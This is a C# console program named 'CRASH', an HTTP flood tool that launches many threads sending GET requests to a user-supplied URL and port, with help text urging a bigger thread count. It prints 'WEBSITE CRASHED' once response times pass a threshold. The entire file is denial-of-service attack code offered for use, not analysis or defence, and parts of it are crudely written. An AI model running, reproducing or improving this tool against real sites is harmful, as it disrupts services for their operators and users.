using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
namespace wscrsr
{
    internal class Program
    {
        static int port = 80;
        static string ur = "";
        static int pings = 0;
        static bool isport = false;
        static bool running = false;
        static int amount = 1000;
        static void Main(string[] args)
        {
            Console.Title = "CRASH";
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(@" 
      ___           ___           ___           ___           ___             
     /  /\         /  /\         /  /\         /  /\         /__/\    
    /  /:/        /  /::\       /  /::\       /  /:/_        \  \:\   
   /  /:/        /  /:/\:\     /  /:/\:\     /  /:/ /\        \__\:\  
  /  /:/  ___   /  /:/~/:/    /  /:/~/::\   /  /:/ /::\   ___ /  /::\ 
 /__/:/  /  /\ /__/:/ /:/___ /__/:/ /:/\:\ /__/:/ /:/\:\ /__/\  /:/\:\
 \  \:\ /  /:/ \  \:\/:::::/ \  \:\/:/__\/ \  \:\/:/~/:/ \  \:\/:/__\/
  \  \:\  /:/   \  \::/~~~~   \  \::/       \  \::/ /:/   \  \::/     
   \  \:\/:/     \  \:\        \  \:\        \__\/ /:/     \  \:\     
    \  \::/       \  \:\        \  \:\         /__/:/       \  \:\    
     \__\/         \__\/         \__\/         \__\/         \__\/");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\n_____________________________________________________________________________________________________________________");
            Console.Write("\n\n");Console.ForegroundColor = ConsoleColor.White;
            
            while (true)
            {
                if (!running)
                {
                    Console.Write(">");
                    string[] cmd = Console.ReadLine().Split(' ');
                    if (cmd[0] == "url")
                    {
                        ur = cmd[1];
                    }
                    else if (cmd[0] == "start")
                    {
                        running = true;
                        Console.WriteLine(@"
  __                   __  
 |__)/  \|\ ||\ |||\ |/ _  
 | \ \__/| \|| \||| \|\__) 
                         ");
                        try
                        {
                            amount = int.Parse(cmd[1]);
                            try
                            {
                                port = int.Parse(cmd[2]);
                                isport = true;
                                System.Threading.Thread t = new System.Threading.Thread(runner);
                                t.Start();


                            }
                            catch (Exception)
                            {
                                System.Threading.Thread t = new System.Threading.Thread(runner);
                                t.Start();
                            }


                        }
                        catch (Exception)
                        {
                            System.Threading.Thread t = new System.Threading.Thread(runner);
                            t.Start();
                        }

                    }
                    else if (cmd[0] == "help")
                    {
                        Console.WriteLine("Steps:\n1. Type \"url\" \"the url\"\n\n2. Type \"start\" \"the amount\" (bigger is better, optional) \"the port\" (optional) \"\n");
                    }
                }
            }
            
        }
        static void runner() {
            for (int x = 0; x < amount; x++) {
                System.Threading.Thread i = new System.Threading.Thread(gogogo);
                i.Start();
                    
                port += x;
            }
        }
        static void fd() {
            try
            {
                System.Net.Http.HttpClient c = new System.Net.Http.HttpClient();
                TimeSpan t = new TimeSpan(1000);
                c.Timeout = t;
                c.GetAsync(ur);
            }
            catch (Exception) { }
        }
        static void gogogo() {
            System.Diagnostics.Stopwatch time= new System.Diagnostics.Stopwatch();
            time.Start();
            for (int x = 0; x < 5; x++) {
                System.Threading.Thread o = new System.Threading.Thread(fd);
                o.Start();
            }
            time.Stop(); Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("p:" + time.Elapsed.Milliseconds);
            pings++;
            if (!isport)
            {
                System.Diagnostics.Stopwatch timer = new System.Diagnostics.Stopwatch();
                timer.Start();

                try
                {
                    
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(ur);
                

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                response.Close();
                }
                catch (Exception)
                {
                Console.WriteLine("crashed...");
                }
                timer.Stop();

                TimeSpan timeTaken = timer.Elapsed;
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.WriteLine(timeTaken.Milliseconds + "..");
                if (timeTaken.Milliseconds > 1400)
                {
                    Console.WriteLine("\nWEBSITE CRASHED WITH \n" + pings + " PINGS");
                    
                }
            }
            else {
                System.Diagnostics.Stopwatch timer = new System.Diagnostics.Stopwatch();
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(ur + ":" + port);
                timer.Start();
                try
                {
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    response.Close();
                }
                catch (Exception) {
                    Console.WriteLine("crashed...");
                }
                timer.Stop();
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                TimeSpan timeTaken = timer.Elapsed;

                Console.Write(timeTaken.Milliseconds + "..");
                if (timeTaken.Milliseconds > 1400) {
                    Console.WriteLine("\nWEBSITE CRASHED WITH \n" + pings + " PINGS");
                }

            }
            
           
        }
        
    }
}
